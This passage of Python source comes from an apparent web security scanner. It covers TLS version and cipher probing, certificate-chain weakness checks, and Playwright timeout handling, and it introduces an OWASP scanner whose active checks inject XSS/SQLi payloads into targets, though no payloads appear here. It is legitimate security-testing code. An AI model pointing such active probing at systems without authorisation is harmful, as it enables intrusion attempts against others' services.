        cached = getattr(self, "_tls13_pin_capable", None)
        if cached is not None:
            return cached
        capable = False
        if hasattr(ssl.SSLContext, "set_ciphersuites"):
            capable = True
        else:
            try:
                t = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                t.set_ciphers("TLS_AES_128_GCM_SHA256")
                capable = True
            except Exception:
                capable = False
        self._tls13_pin_capable = capable
        return capable

    def _try_connect(self, host: str, port: int, min_ver: Any,
                     max_ver: Any, cipher: Optional[str],
                     timeout: float = 5.0,
                     cipher13: Optional[str] = None) -> Tuple[bool, str]:
        """Attempt one TLS handshake pinned to a version (+ optional cipher).

        Returns (accepted, detail). accepted=True only when the handshake
        completed. Any failure (version/cipher refused, timeout, the cipher
        name being unknown to this OpenSSL build) returns accepted=False with
        a short detail string. Never raises.

        TLS 1.2-and-below cipher selection uses `cipher` (→ set_ciphers).
        TLS 1.3 cipher selection uses `cipher13` (→ set_ciphersuites), because
        TLS 1.3 suites are a separate namespace in OpenSSL and are NOT
        controlled by set_ciphers.
        """
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        except Exception as e:  # pragma: no cover - extremely defensive
            return (False, f"ctx-build-failed: {e}")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.minimum_version = min_ver
            ctx.maximum_version = max_ver
        except (ValueError, AttributeError):
            # Version not supported by this build → treat as not accepted.
            return (False, "version-unavailable")
        if cipher:
            try:
                ctx.set_ciphers(cipher)
            except ssl.SSLError:
                # Cipher name unknown to this OpenSSL build — skip it.
                return (False, "cipher-unknown")
            except Exception:
                return (False, "cipher-unselectable")
        if cipher13:
            # TLS 1.3 cipher selection. Preferred API is set_ciphersuites
            # (Python 3.8 + OpenSSL 1.1.1+). Some builds lack it but accept
            # TLS 1.3 suite names in set_ciphers (merged namespace). If
            # neither works, this build cannot pin a TLS 1.3 cipher at all.
            setter = getattr(ctx, "set_ciphersuites", None)
            if setter is not None:
                try:
                    setter(cipher13)
                except ssl.SSLError:
                    return (False, "cipher13-unknown")
                except Exception:
                    return (False, "cipher13-unselectable")
            else:
                try:
                    ctx.set_ciphers(cipher13)
                except ssl.SSLError:
                    return (False, "tls13-not-pinnable")
                except Exception:
                    return (False, "cipher13-unselectable")
        try:
            with socket.create_connection((host, port), timeout=timeout) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as ssock:
                    _ = ssock.version()  # touch to confirm handshake completed
                    return (True, "ok")
        except socket.timeout:
            return (False, "timeout")
        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            return (False, f"conn-error: {type(e).__name__}")
        except ssl.SSLError as e:
            return (False, f"ssl-error: {str(e)[:60]}")
        except Exception as e:
            return (False, f"error: {type(e).__name__}")

    def _negotiated_tls13_cipher(self, host: str, port: int,
                                 timeout: float = 5.0) -> str:
        """Pin TLS 1.3 with a permissive cipher setting and return the suite
        name the server actually negotiates ("" on any failure).

        Used when this Python build can't pin individual TLS 1.3 ciphers
        (no set_ciphersuites) — we can't enumerate every suite, but we CAN
        show the one the server picks, which is concrete data instead of an
        empty TLS 1.3 section. Never raises.
        """
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            V = ssl.TLSVersion
            v13 = getattr(V, "TLSv1_3", None)
            if v13 is None:
                return ""
            ctx.minimum_version = v13
            ctx.maximum_version = v13
            with socket.create_connection((host, port), timeout=timeout) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as ssock:
                    cipher_tuple = ssock.cipher()
                    return cipher_tuple[0] if cipher_tuple else ""
        except Exception:
            return ""

    def _probe_ciphers(self, host: str, port: int, record: SSLRecord) -> None:
        """Enumerate accepted cipher suites + protocol versions (testssl-style).

        Adds ~25 cipher probes + ~4 protocol probes, each one short TLS
        handshake, 50ms apart, with a 12s soft deadline on the batch.

        IMPORTANT — runs the probe loop in a DAEMON THREAD and joins it with
        a hard 20s cap. The scanner's main flow is async and SSL (Step 4)
        runs BEFORE the crawler (Step 5), so this method MUST return in
        bounded time — otherwise a target that accepts TCP then hangs on
        weird-cipher ClientHellos (socket timeout not always honoured on
        Windows) would block the asyncio event loop and the scan would never
        start crawling. The thread can't be killed, but as a daemon it won't
        block process exit, and inspect() proceeds with whatever results
        were collected (possibly empty) once the join cap elapses.

        This method never raises and never aborts the scan.
        """
        import time as _time
        import threading

        SOFT_DEADLINE_S = 12.0   # the probe loop checks this and stops early
        HARD_JOIN_CAP_S = 20.0  # backstop: inspect() never blocks longer
        spacing = 0.05

        def _run_probe_loop() -> None:
            """The actual probe work, run inside the daemon thread."""
            deadline = _time.monotonic() + SOFT_DEADLINE_S
            local_results: List[Dict[str, Any]] = []

            # --- Protocol-version probes ---
            for label, attr, lo, hi in self._proto_probe_table():
                if _time.monotonic() > deadline:
                    break
                accepted, _detail = self._try_connect(host, port, lo, hi, None)
                if accepted:
                    setattr(record, attr, True)
                _time.sleep(spacing)

            # --- TLS 1.2 cipher-suite probes ---
            for cipher, proto in self._CIPHER_PROBE_LIST:
                if _time.monotonic() > deadline:
                    self.logger.log("ssl_inspect",
                                    "cipher probe batch hit soft deadline; "
                                    "stopping early (partial results saved)")
                    break
                V = ssl.TLSVersion
                ver = getattr(V, {
                    "TLSv1":   "TLSv1",
                    "TLSv1.1": "TLSv1_1",
                    "TLSv1.2": "TLSv1_2",
                    "TLSv1.3": "TLSv1_3",
                }.get(proto, "TLSv1_2"), getattr(V, "TLSv1_2", None))
                if ver is None:
                    continue
                accepted, detail = self._try_connect(host, port, ver, ver, cipher)
                strength, reason, severity = _classify_cipher_strength(cipher)
                local_results.append({
                    "cipher": cipher,
                    "protocol": proto,
                    "accepted": accepted,
                    "strength": strength,
                    "reason": reason,
                    "severity": severity,
                    "detail": detail if not accepted else "",
                })
                _time.sleep(spacing)

            # --- TLS 1.3 cipher-suite probes (only if 1.3 supported + pinnable) ---
            if record.supports_tls_1_3 and self._can_pin_tls13_cipher():
                V = ssl.TLSVersion
                v13 = getattr(V, "TLSv1_3", None)
                if v13 is not None:
                    for cipher13 in self._TLS_1_3_CIPHERS:
                        if _time.monotonic() > deadline:
                            self.logger.log("ssl_inspect",
                                            "TLS 1.3 cipher probe batch hit "
                                            "soft deadline; stopping early")
                            break
                        accepted, detail = self._try_connect(
                            host, port, v13, v13, None, cipher13=cipher13)
                        strength, reason, severity = _classify_cipher_strength(cipher13)
                        local_results.append({
                            "cipher": cipher13,
                            "protocol": "TLSv1.3",
                            "accepted": accepted,
                            "strength": strength,
                            "reason": reason,
                            "severity": severity,
                            "detail": detail if not accepted else "",
                        })
                        _time.sleep(spacing)
            elif record.supports_tls_1_3:
                # Server speaks TLS 1.3 but this Python build can't pin
                # individual TLS 1.3 ciphers (no set_ciphersuites). We can't
                # enumerate every suite, but we CAN pin TLS 1.3 with a
                # permissive cipher setting and read the one suite the server
                # actually negotiates — so the cipher table shows at least one
                # concrete Accepted TLS 1.3 row instead of being empty.
                neg13 = self._negotiated_tls13_cipher(host, port)
                if neg13:
                    strength, reason, severity = _classify_cipher_strength(neg13)
                    local_results.append({
                        "cipher": neg13,
                        "protocol": "TLSv1.3",
                        "accepted": True,
                        "strength": strength,
                        "reason": reason,
                        "severity": severity,
                        "detail": "negotiated (full per-cipher enumeration "
                                  "requires ssl.SSLContext.set_ciphersuites)",
                    })
                self.logger.log(
                    "ssl_inspect",
                    "TLS 1.3 per-cipher enumeration unavailable on this "
                    "Python build (no ssl.SSLContext.set_ciphersuites). "
                    f"Recorded the server's negotiated TLS 1.3 cipher "
                    f"({neg13 or record.negotiated_cipher or 'unknown'}) as a "
                    "single Accepted row. Run on a Python build with "
                    "set_ciphersuites for full per-cipher TLS 1.3 enumeration.")

            # Single atomic assignment at the very end. If the hard join cap
            # below elapses before we reach here, record.supported_ciphers
            # stays at its default ([]) — scan continues, just no cipher data.
            record.supported_ciphers = local_results

        # Run the loop in a daemon thread; join with a hard cap so inspect()
        # (and therefore the whole SSL phase + the subsequent crawl) cannot
        # be held hostage by a hung socket.
        t = threading.Thread(target=_run_probe_loop, daemon=True)
        t.start()
        t.join(timeout=HARD_JOIN_CAP_S)
        if t.is_alive():
            self.logger.log(
                "ssl_inspect",
                f"cipher probe thread did not finish within {HARD_JOIN_CAP_S}s "
                "hard cap (a TLS handshake likely hung past its socket "
                "timeout). Proceeding with partial/empty cipher results so "
                "the scan can continue to the crawl phase. The hung probe "
                "runs on a daemon thread and will not block scan exit.")

    def _decode_full_chain(self, record: SSLRecord, der_certs: List[bytes]) -> None:
        """Decode every cert in the presented chain (leaf, intermediates, root).

        Uses the cryptography library if available; silently no-ops otherwise
        (the PEM chain in record.pem_chain is still saved for manual inspection
        with `openssl x509 -text`). Never raises.
        """
        if not der_certs:
            return
        try:
            from cryptography import x509  # type: ignore
            from cryptography.x509.oid import ExtensionOID  # type: ignore
        except ImportError:
            return  # PEM chain still saved; just no decoded details.

        details: List[Dict[str, Any]] = []
        weak_keys: List[str] = []
        weak_sigs: List[str] = []
        n = len(der_certs)
        # Key-type imports for weak-key detection.
        try:
            from cryptography.hazmat.primitives.asymmetric import (  # type: ignore
                rsa as _rsa, dsa as _dsa, ec as _ec,
            )
        except Exception:
            _rsa = _dsa = _ec = None
        for i, der in enumerate(der_certs):
            role = "leaf" if i == 0 else ("root" if i == n - 1 else "intermediate")
            entry: Dict[str, Any] = {
                "position": i,
                "role": role,
            }
            try:
                cert = x509.load_der_x509_certificate(der)
                entry["subject"] = cert.subject.rfc4514_string()
                entry["issuer"] = cert.issuer.rfc4514_string()
                # not_valid_before_utc / not_valid_after_utc: cryptography 42+
                try:
                    entry["not_before"] = cert.not_valid_before_utc.isoformat()
                    entry["not_after"] = cert.not_valid_after_utc.isoformat()
                except AttributeError:
                    entry["not_before"] = cert.not_valid_before.isoformat()
                    entry["not_after"] = cert.not_valid_after.isoformat()
                try:
                    bc = cert.extensions.get_extension_for_oid(
                        ExtensionOID.BASIC_CONSTRAINTS).value
                    entry["is_ca"] = bool(getattr(bc, "ca", False))
                except x509.ExtensionNotFound:
                    entry["is_ca"] = False
                entry["is_self_signed"] = (cert.subject == cert.issuer)
                try:
                    entry["signature_algorithm"] = \
                        cert.signature_algorithm_oid._name
                except Exception:
                    entry["signature_algorithm"] = ""

                # --- Public key size + algorithm + weak-key detection ----------
                if _rsa is not None:
                    try:
                        pub = cert.public_key()
                        key_alg = ""
                        key_size: Optional[int] = None
                        if isinstance(pub, _rsa.RSAPublicKey):
                            key_alg = "RSA"; key_size = pub.key_size
                        elif isinstance(pub, _dsa.DSAPublicKey):
                            key_alg = "DSA"; key_size = pub.key_size
                        elif isinstance(pub, _ec.EllipticCurvePublicKey):
                            key_alg = "ECC (" + getattr(pub.curve, "name", "?") + ")"
                            key_size = getattr(pub.curve, "key_size", None)
                        else:
                            # Ed25519/Ed448/X25519 — modern, no comparable
                            # "key_size" weakness; record the type only.
                            key_alg = type(pub).__name__.replace("PublicKey", "")
                        entry["key_algorithm"] = key_alg
                        if key_size is not None:
                            entry["key_size"] = key_size
                        # Weak-key thresholds per NIST/Mozilla guidance.
                        weak = None
                        if key_alg == "RSA" and key_size is not None and key_size < 2048:
                            weak = f"RSA {key_size}-bit key (< 2048 — factorable)"
                        elif key_alg == "DSA" and key_size is not None and key_size < 2048:
                            weak = f"DSA {key_size}-bit key (< 2048 — DSA in TLS is deprecated)"
                        elif key_alg.startswith("ECC") and key_size is not None and key_size < 256:
                            weak = f"{key_alg} ({key_size}-bit, < 256 — curve too small)"
                        if weak:
                            entry["weak_key"] = weak
                            weak_keys.append(f"{role}: {weak}")
                    except Exception:
                        pass

                # --- Weak signature algorithm detection -------------------------
                sig_alg = str(entry.get("signature_algorithm", "") or "")
                low = sig_alg.lower()
                if "sha1" in low:
                    entry["weak_signature"] = sig_alg
                    weak_sigs.append(f"{role}: {sig_alg} (SHA-1 — collision-broken, deprecated)")
                elif "md5" in low:
                    entry["weak_signature"] = sig_alg
                    weak_sigs.append(f"{role}: {sig_alg} (MD5 — collision-broken)")
            except Exception as e:
                entry["parse_error"] = f"{type(e).__name__}: {e}"
            details.append(entry)
        record.cert_chain_details = details
        record.weak_key_sizes_detected = weak_keys
        record.weak_signature_algorithms_detected = weak_sigs

    # --- Cert field extractors --------------------------------------------

    def _populate_from_cryptography(self, record: SSLRecord, cert: Any, host: str) -> None:
        """Extract certificate fields using the `cryptography` library."""
        from cryptography import x509  # type: ignore
        from cryptography.x509.oid import NameOID, ExtensionOID  # type: ignore

        # Subject and Issuer as human-readable strings.
        record.subject = cert.subject.rfc4514_string()
        record.issuer = cert.issuer.rfc4514_string()

        # Validity period.
        try:
            # not_valid_before_utc / not_valid_after_utc were added in
            # cryptography 42.0. Fall back to naive versions if absent.
            try:
                not_before = cert.not_valid_before_utc
                not_after = cert.not_valid_after_utc
            except AttributeError:
                not_before = cert.not_valid_before.replace(tzinfo=timezone.utc)
                not_after = cert.not_valid_after.replace(tzinfo=timezone.utc)
            record.not_before = not_before.isoformat()
            record.not_after = not_after.isoformat()
            now = datetime.now(timezone.utc)
            record.is_expired = not_after < now
            record.days_until_expiry = (not_after - now).days
        except Exception:
            pass

        # Self-signed check: subject == issuer.
        record.is_self_signed = (cert.subject == cert.issuer)

        # Hostname mismatch check: compare against CN and SANs.
        # We use cryptography's built-in SAN extraction.
        san_names: List[str] = []
        try:
            san_ext = cert.extensions.get_extension_for_oid(
                ExtensionOID.SUBJECT_ALTERNATIVE_NAME,
            )
            san_names = san_ext.value.get_values_for_type(x509.DNSName)
        except x509.ExtensionNotFound:
            pass
        cn = ""
        try:
            cn_attrs = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
            if cn_attrs:
                cn = cn_attrs[0].value
        except Exception:
            pass
        # A certificate matches `host` if:
        #   - CN == host (legacy), OR
        #   - Any SAN matches host exactly or via wildcard (*.example.com).
        record.hostname_mismatch = not self._cert_matches_host(host, cn, san_names)

    def _cert_matches_host(self, host: str, cn: str, san_names: List[str]) -> bool:
        """Return True if `host` matches the cert's CN or any SAN.

        We support exact matches and leftmost wildcard (*.example.com).
        We do NOT support middle/right wildcards — they're invalid per
        RFC 6125 and a sign of a misconfigured cert.
        """
        host = host.lower()
        candidates = [cn.lower()] + [s.lower() for s in san_names]
        for name in candidates:
            if not name:
                continue
            if name == host:
                return True
            if name.startswith("*."):
                # Wildcard matches ONE label of the host.
                suffix = name[1:]  # '.example.com'
                if host.endswith(suffix):
                    # Ensure exactly one label is being wildcarded.
                    prefix = host[:-len(suffix)]
                    if prefix and "." not in prefix:
                        return True
        return False

    def _populate_from_ssl_module(self, record: SSLRecord, der_cert: bytes, host: str) -> None:
        """Fallback: extract cert fields using only stdlib `ssl`.

        Used only when the `cryptography` library is not importable. We
        already have the leaf cert as DER bytes (captured during the
        handshake), so we convert to PEM, write it to a temp file, and use
        ssl._ssl._test_decode_cert() on that file. (NB: _test_decode_cert
        takes a FILE PATH, not a hostname — passing the hostname was the
        old bug that produced 'Can't open file'.)
        """
        import tempfile
        pem_path: Optional[str] = None
        try:
            pem = ssl.DER_cert_to_PEM_cert(der_cert)
            # NamedTemporaryFile(delete=False) so we can pass the path to
            # _test_decode_cert; we unlink it in finally.
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".pem", delete=False, encoding="utf-8"
            ) as tf:
                tf.write(pem)
                pem_path = tf.name
            cert_dict = ssl._ssl._test_decode_cert(  # type: ignore[attr-defined]
                pem_path
            )
            record.subject = ", ".join(
                f"{k}={v}" for k, v in cert_dict.get("subject", [])[0]
            ) if cert_dict.get("subject") else ""
            record.issuer = ", ".join(
                f"{k}={v}" for k, v in cert_dict.get("issuer", [])[0]
            ) if cert_dict.get("issuer") else ""
            record.not_after = cert_dict.get("notAfter", "")
            record.not_before = cert_dict.get("notBefore", "")
            # Best-effort expiry check by parsing the date string.
            if record.not_after:
                try:
                    # Format: 'May  5 12:00:00 2025 GMT'
                    na = datetime.strptime(record.not_after,
                                           "%b %d %H:%M:%S %Y %Z")
                    record.is_expired = na < datetime.now(na.tzinfo or timezone.utc)
                    record.days_until_expiry = (
                        na - datetime.now(na.tzinfo or timezone.utc)
                    ).days
                except Exception:
                    pass
            # SAN extraction from the dict's 'subjectAltName' field.
            san = cert_dict.get("subjectAltName", [])
            san_names = [v for k, v in san if k == "DNS"]
            # CN extraction. _test_decode_cert returns 'subject' as a nested
            # list: [[(key, value), ...], ...] (one inner list per RDN).
            # Walk the nested structure rather than unpacking the outer list.
            cn = ""
            for rdn in cert_dict.get("subject", []) or []:
                for k, v in rdn:
                    if k == "commonName":
                        cn = v
                        break
                if cn:
                    break
            record.hostname_mismatch = not self._cert_matches_host(host, cn, san_names)
        except Exception as e:
            self.logger.log("ssl_inspect",
                            f"stdlib cert parse failed: {e}")
        finally:
            if pem_path:
                try:
                    os.unlink(pem_path)
                except Exception:
                    pass


# ============================================================================
# SECTION 13 — OWASP TOP 10 SCANNER (Passive + Active)
# ============================================================================
#
# This module performs two distinct classes of check:
#
#   PASSIVE checks inspect what the application ALREADY returns — they do
#   not send any payload. They are safe to run against production targets
#   and form the bulk of the "header/cookie/cert" findings.
#
#   ACTIVE checks send crafted inputs (XSS/SQLi payloads) into discovered
#   injection points. They are intrinsically risky and MUST only be run
#   against targets the engineer is authorised to test. Every active check
#   produces a Finding record marked unverified=True, with the raw request
#   and response persisted to disk for human audit.
#
# WHY REGEX OVER HEURISTICS:
# A heuristic ("does this response look like it might be vulnerable?")
# produces too many false positives in audit contexts and erodes engineer
# trust in the tool. We use STRICT regex patterns that match CONCRETE
# evidence of execution or unescaped reflection. Every match is still
# labelled "Unverified - Requires Manual Confirmation" because regex
# cannot prove that a browser would actually execute the reflected content
# (the surrounding context may escape it).

@dataclass
class PassiveFindings:
    """Container for all passive-check results."""
    missing_security_headers: List[str] = field(default_factory=list)
    insecure_cookies: List[Dict[str, Any]] = field(default_factory=list)
    mixed_content: List[Dict[str, Any]] = field(default_factory=list)
    # 'other' is a catch-all for future passive checks (e.g. CSP weak directives).
    other: List[Dict[str, Any]] = field(default_factory=list)
    # NEW: Error messages in page (A10:2025 Server-Side Request Forgery /
    # A05:2025 Security Misconfiguration — error messages reveal stack
    # traces, internal paths, database info, etc.)
    error_messages: List[Dict[str, Any]] = field(default_factory=list)
    # NEW: Session cookie configuration issues (A07:2025 Identification &
    # Authentication Failures — cookie lifetime, domain scope, path scope)
    session_cookie_config: List[Dict[str, Any]] = field(default_factory=list)
    # NEW: Sensitive information in pages (A02:2025 Cryptographic Failures /
    # A01:2025 Broken Access Control — emails, API keys, internal IPs,
    # credit card patterns, SSN patterns, private keys, etc.)
    sensitive_info: List[Dict[str, Any]] = field(default_factory=list)
    # NEW: Filename of a full-page screenshot captured when error_messages
    # or sensitive_info are found (saved in the evidence/ dir). The UI
    # renders it via /api/scans/<id>/evidence/<filename>. Empty when no
    # screenshot was captured (e.g. nothing found, or capture failed).
    screenshot_path: Optional[str] = None


# ============================================================================
# HARD TIMEOUT HELPER for all Playwright actions
# ============================================================================
#
# WHY THIS EXISTS:
# Playwright's `page.goto()`, `page.content()`, `elem.fill()`, `click()`,
# etc. can hang INDEFINITELY on pages that:
#   - Keep the network busy (long-polling, SSE, WebSocket, never-ending
#     background fetches) — `wait_until="networkidle"` never resolves
#   - Have a `<link rel="stylesheet">` that the server never finishes sending
#   - Trigger a JavaScript alert/confirm/prompt (now handled by our dialog
#     handler, but other modal blocking is possible)
#   - The server responds instantly (curl proves it) but the browser's
#     internal resource loader gets stuck on a sub-resource
#
# Even when we pass `timeout=` to Playwright, it sometimes retries internally
# or waits for cleanup. The ONLY reliable way to prevent a frozen scan is
# to wrap EVERY Playwright call in asyncio.wait_for with a hard cap.
#
# This helper does that. Default cap: 5 seconds per action. If the action
# exceeds it, we log a warning and raise TimeoutError so the caller can
# proceed with whatever partial state it has.
#
# Usage:
#   await _pw(page.goto, url, wait_until="domcontentloaded")
#   await _pw(page.content)
#   await _pw(elem.fill, payload)
#   await _pw(page.query_selector, selector)
#
# Every Playwright API that returns a coroutine is supported.

# Default hard timeout for a single Playwright action. 5s is aggressive
# but necessary — the user explicitly requested it to prevent freezes on
# pages that keep the network busy. Most pages load in <2s; 5s gives
# ample headroom for slow targets without letting one stuck action
# bottleneck the entire scan.
PW_ACTION_TIMEOUT_SECONDS = 5.0

# Set of id(page) for pages that have had a timeout and are likely broken.
# Subsequent _pw() calls on a poisoned page return the default immediately
# without trying the Playwright call — because the Playwright connection
# is still busy with the cancelled-but-not-really C call, and ANY new call
# on that page will hang for the full timeout duration, making the scan
# appear frozen (no pw_action_timeout in the trail because each call is
# silently eating 5s).
# The page is un-poisoned when the caller navigates to about:blank (which
# creates a fresh navigation context).
_POISONED_PAGES: set = set()


def _extract_page_from_args(func: Any, args: tuple) -> Any:
    """Try to find the Page object from the function and its args.

    For bound methods like `page.goto`, `page` is `func.__self__`.
    For `elem.fill`, the page is `elem._page` (Playwright internal).
    For `page.context.request.fetch`, page is None (context-level call).
    """
    # Bound method — check __self__
    self_obj = getattr(func, "__self__", None)
    if self_obj is not None:
        # Check if self_obj IS a Page
        if hasattr(self_obj, "goto") and hasattr(self_obj, "content"):
            return self_obj
        # Check if self_obj is an ElementHandle (has _page attribute)
        page = getattr(self_obj, "_page", None)
        if page is not None:
            return page
        # Check if self_obj is a Keyboard (has _page)
        page = getattr(self_obj, "page", None)
        if page is not None and hasattr(page, "goto"):
            return page
    # Check first positional arg
    if args and hasattr(args[0], "goto") and hasattr(args[0], "content"):
        return args[0]
    return None


async def _pw(func: Any, *args: Any, default: Any = None, **kwargs: Any) -> Any:
    """Wrap a Playwright coroutine with a hard timeout + page poisoning.

    CRITICAL BEHAVIOUR:
    When a Playwright call times out, asyncio.wait_for() cancels the Python
    coroutine, but Playwright's underlying C call continues running on the
    browser side. The Playwright connection for that page is now PERMANENTLY
    BUSY — every subsequent call (page.content(), page.goto(), etc.) will
    also hang for the full timeout duration.

    This was the root cause of the "scanner freezes with no pw_action_timeout
    output" bug: the form submission hung, _pw cancelled it, but then every
    subsequent page.content() / page.evaluate() call on the same page also
    hung for 5s each, making the scan appear frozen.

    FIX: After a timeout, we "poison" the page. Subsequent _pw() calls on a
    poisoned page return `default` IMMEDIATELY (without calling Playwright).
    The caller is responsible for resetting the page (navigating to
    about:blank) which un-poisons it.

    Args:
        func: The Playwright method (e.g. page.goto, page.content, elem.fill).
        *args, **kwargs: Passed through to the method.
        default: Value to return if the action times out (instead of raising).

    Returns:
        The result of `func(*args, **kwargs)`, or `default` on timeout.

    Raises:
        asyncio.TimeoutError: if the action times out and `default` is not provided.
    """
    # Extract the Page object so we can check if it's poisoned.
    page = _extract_page_from_args(func, args)
    # CRITICAL: Use a unique, non-reusable identifier instead of id(page).
    # Python may reuse memory addresses (id() values) after garbage
    # collection, so a freshly created page could inherit the id of a
    # previously poisoned page — causing _pw() to skip ALL actions on
    # the new page (silent test skipping, 0 findings for the rest of
    # the scan).
    #
    # Fix: assign a UUID to each page immediately after creation and
    # use that as the poison key. The UUID is stored as a custom
    # attribute on the page object (page._webrecon_uid).
    page_uid = None
    if page is not None:
        page_uid = getattr(page, "_webrecon_uid", None)

    # If the page is poisoned (previous call timed out), return default
    # immediately without calling Playwright. This prevents the cascade of
    # 5s timeouts that makes the scan appear frozen.
    if page_uid is not None and page_uid in _POISONED_PAGES:
        try:
            GLOBAL_STATE.logger.log(
                "pw_action_skipped",
                f"action={getattr(func, '__name__', str(func))} "
                f"skipped — page is poisoned (previous call timed out)",
            )
        except Exception:
            pass
        if default is not _PW_NO_DEFAULT:
            return default
        raise asyncio.TimeoutError("Page is poisoned (previous Playwright call timed out)")

    try:
        result = await asyncio.wait_for(
            func(*args, **kwargs),
            timeout=PW_ACTION_TIMEOUT_SECONDS,
        )
        return result
    except asyncio.TimeoutError:
        # Log the timeout so it appears in the execution trail.
        try:
            GLOBAL_STATE.logger.log(
                "pw_action_timeout",
                f"action={getattr(func, '__name__', str(func))} "
                f"exceeded {PW_ACTION_TIMEOUT_SECONDS}s — proceeding with partial response",
            )
        except Exception:
            print(
                f"[WARN] Playwright action {getattr(func, '__name__', str(func))} "
                f"timed out after {PW_ACTION_TIMEOUT_SECONDS}s. Proceeding with partial response.",
                file=sys.stderr, flush=True,
            )

        # POISON the page so subsequent _pw() calls skip immediately.
        # This is the critical fix — without it, every subsequent call on
        # this page will hang for 5s each, freezing the scan.
        #
        # Uses page_uid (UUID) instead of id(page) to prevent ID reuse
        # — see the comment above where page_uid is computed.
        if page_uid is not None:
            _POISONED_PAGES.add(page_uid)
            # Try to recover the page by navigating to about:blank.
            # If this succeeds, the page is un-poisoned and usable again.
            # We do this in the background (non-blocking) so the caller
            # can proceed immediately with the default value.
            if page is not None:
                asyncio.create_task(_try_recover_page(page, page_uid))

        if default is not _PW_NO_DEFAULT:
            return default
        raise


async def _safe_close_page(page: Any) -> None:
    """Gracefully close a Playwright page (full shutdown ladder).

    Used as a fire-and-forget background task when the quick close
    (below) fails. A bare `page.close()` frequently hangs because:
      - The payload left an active `<script>` running (infinite loop,
        setInterval, pending fetch). Playwright's CDP close command
        waits for the page's main thread to yield — which never happens.
      - The page has in-flight network requests (slow API, hanging
        socket). close() waits for them to settle.
      - A modal dialog (alert/confirm) is open. close() blocks on it.

    Shutdown ladder (each step has a hard timeout, fall through on fail):
      1. `page.goto("about:blank", wait_until="domcontentloaded")` — 2s.
         This is the KEY step: it cancels pending navigation, stops ALL
         JS execution (the old document is destroyed), aborts in-flight
         fetch/XHR, and closes any open modal dialog. about:blank loads
         instantly and replaces whatever was on the page.
      2. `page.close()` — 2s. Now that the page is quiet, this should
         succeed quickly.
      3. If both fail, the page is completely wedged (zombie renderer).
         Abandon it — the BrowserContext will force-close it at scan end,
         and the retry loop in active_scan will pkill Chrome if too many
         pages accumulate.

    Total worst-case: 4s. Run as a background task so it never blocks
    the main scan loop.
    """
    # Step 1: navigate to about:blank to stop all activity
    try:
        await asyncio.wait_for(
            page.goto("about:blank", wait_until="domcontentloaded"),
            timeout=2.0,
        )
    except Exception:
        pass  # goto failed — try close anyway

    # Step 2: close the (now quiet) page
    try:
        await asyncio.wait_for(page.close(), timeout=2.0)
        return
    except Exception:
        # Step 3: page is wedged. Abandon it — context will force-close
        # at scan end, and the retry loop will pkill Chrome if too many
        # pages accumulate.
        pass


async def _quick_close_page(page: Any) -> bool:
    """Try a fast page.close() with a short timeout.

    Returns True if the page was closed successfully within the timeout,
    False if the page is busy (active JS, in-flight requests, open dialog)
    and needs the full graceful shutdown ladder.

    This is the common-case fast path: ~95% of pages are already quiet
    when we get to close them (the payload either executed successfully
    or threw a quick error). For those, close() returns in <100ms and
    we avoid the 2s+ overhead of the graceful ladder.

    For the ~5% of pages that are busy, the caller should fire-and-forget
    `_safe_close_page(page)` as a background task and continue to the
    next test — the graceful ladder will eventually clean them up.
    """
    try:
        await asyncio.wait_for(page.close(), timeout=1.5)
        return True
    except Exception:
        return False


async def _try_recover_page(page: Any, page_uid: str) -> None:
    """Try to navigate a poisoned page to about:blank to un-poison it.

    This runs in the background after a timeout. If it succeeds, the page
    is usable again for the next test. If it also times out, the page
    remains poisoned (subsequent calls will skip immediately).

    Uses page_uid (UUID string) instead of id(page) to prevent ID reuse
    bugs — see _pw() for details.
    """
    try:
        await asyncio.wait_for(
            page.goto("about:blank", wait_until="domcontentloaded"),
            timeout=3.0,
        )
        # Success — un-poison the page.
        _POISONED_PAGES.discard(page_uid)
        try:
            GLOBAL_STATE.logger.log(
                "pw_page_recovered",
                f"page recovered after timeout — navigated to about:blank",
            )
        except Exception:
            pass
    except Exception:
        # Recovery failed — page stays poisoned. The caller should create
        # a new page if needed (the active_scan loop handles this by
        # catching exceptions and continuing to the next payload).
        pass


# --- Heartbeat writer for the external supervisor ---
# GLOBAL — the active_scan loop sets this on entry so the heartbeat
# writer knows where to write. We use a module-level global because the
# writer is called from the hot loop (every test) and we don't want the
# overhead of passing it through every function call.
_GLOBAL_HEARTBEAT_PATH: Optional[Path] = None
_GLOBAL_HEARTBEAT_LOCK = threading.Lock()


def _write_heartbeat(
    tests_done: int,
    total_tests: int,
    phase: str = "active",
    extra: Optional[Dict[str, Any]] = None,
) -> None:
    """Write a heartbeat file for the external supervisor to monitor.

    Called after every test completes (success or fail). The supervisor
    (bin/supervisor.py) is a SEPARATE process that polls this file. If
    the file's timestamp goes stale (no update for N seconds), the
    supervisor kills the scanner PID and restarts with --resume
    --skip-tests <tests_done>.

    This is the ULTIMATE freeze recovery mechanism — it works even when:
      - Playwright's C code blocks the asyncio event loop
      - The in-process watchdog threads are disabled (--no-watchdog)
      - The scanner is completely wedged

    Because the supervisor is a separate OS process, it is unaffected by
    anything that happens inside the scanner's Python process.

    The file is written atomically (write to .tmp, then rename) so the
    supervisor never reads a half-written file.
    """
    global _GLOBAL_HEARTBEAT_PATH
    if _GLOBAL_HEARTBEAT_PATH is None:
        return  # heartbeat not configured for this scan
    try:
        data = {
            "pid": os.getpid(),
            "timestamp": time.time(),
            "iso": datetime.now(timezone.utc).isoformat(),
            "tests_done": tests_done,
            "total_tests": total_tests,
            "phase": phase,
        }
        if extra:
            data.update(extra)
        # Atomic write: write to .tmp, then rename. The supervisor may
        # be reading the file at any moment — rename() is atomic on
        # POSIX, so it never sees a partial write.
        tmp = _GLOBAL_HEARTBEAT_PATH.with_suffix(".json.tmp")
        with _GLOBAL_HEARTBEAT_LOCK:
            tmp.write_text(
                json.dumps(data, ensure_ascii=False),
                encoding="utf-8",
            )
            tmp.replace(_GLOBAL_HEARTBEAT_PATH)
    except Exception:
        # Heartbeat is best-effort — never let it crash the scan.
        pass

